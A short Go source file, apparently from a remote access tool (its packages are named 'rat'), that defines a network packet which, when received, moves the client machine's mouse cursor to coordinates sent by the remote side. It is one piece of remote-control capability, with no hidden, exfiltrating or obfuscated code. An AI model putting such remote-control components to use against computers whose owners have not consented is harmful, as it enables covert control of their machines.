package main

import "rat/shared"
import "rat/client/screen"

type MouseMovePacket struct {
	MonitorID int `network:"receive"`
	X         int `network:"receive"`
	Y         int `network:"receive"`
}

func (packet MouseMovePacket) Header() shared.PacketHeader {
	return shared.MouseMoveHeader
}

func (packet MouseMovePacket) OnReceive() error {
	screen.MoveCursor(packet.MonitorID, packet.X, packet.Y)

	return nil
}
